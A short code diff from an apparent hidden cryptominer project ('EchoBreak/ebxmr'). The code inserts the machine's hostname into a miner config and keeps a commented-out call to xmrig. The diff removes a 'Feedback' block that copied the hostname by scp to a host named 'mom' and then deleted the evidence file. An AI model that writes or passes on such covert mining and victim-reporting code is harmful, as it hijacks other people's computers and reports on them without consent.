@@ -56,10 +56,6 @@ int main() {
     std::string compname = exec("hostname");
     std::string filename = "EchoBreak/ebxmr/config.json";
     editFile(filename, compname);
-	//======Feedback=======
-	system("hostname > compname.txt | touch compname.txt");
-	system("scp compname.txt to mom");
-	system("rm compname.txt");
 
     //=======Mining========
     //system("./xmrig");
